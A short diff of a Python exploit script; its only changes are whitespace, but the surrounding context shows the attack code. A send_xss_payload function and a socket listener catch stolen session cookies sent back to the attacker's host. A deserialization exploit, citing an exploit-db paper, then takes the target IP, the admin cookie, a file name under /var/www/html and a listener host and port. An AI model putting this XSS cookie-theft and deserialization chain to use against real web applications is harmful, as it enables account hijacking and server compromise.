@@ -94,7 +94,6 @@ def send_xss_payload(ip,lhost):
 		return True
 
 def start_xss_server(host,lport):
-        #
         so = socket.socket()
         so.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         so.bind((host,lport))
@@ -105,6 +104,7 @@ def start_xss_server(host,lport):
         data = handler.recv(4096)
         cookies=data.split(b"HTTP")[0][5:].decode("UTF-8")
         return cookies
+
 # https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf
 def exploit_deserialization(ip,admincookie,filename,lhost,lport):
     full_path="/var/www/html/"+filename
@@ -133,7 +133,6 @@ def main():
     ip=sys.argv[1]
     lhost=str(sys.argv[2])
     lport=int(sys.argv[3])
-
 
     print(banner)
 
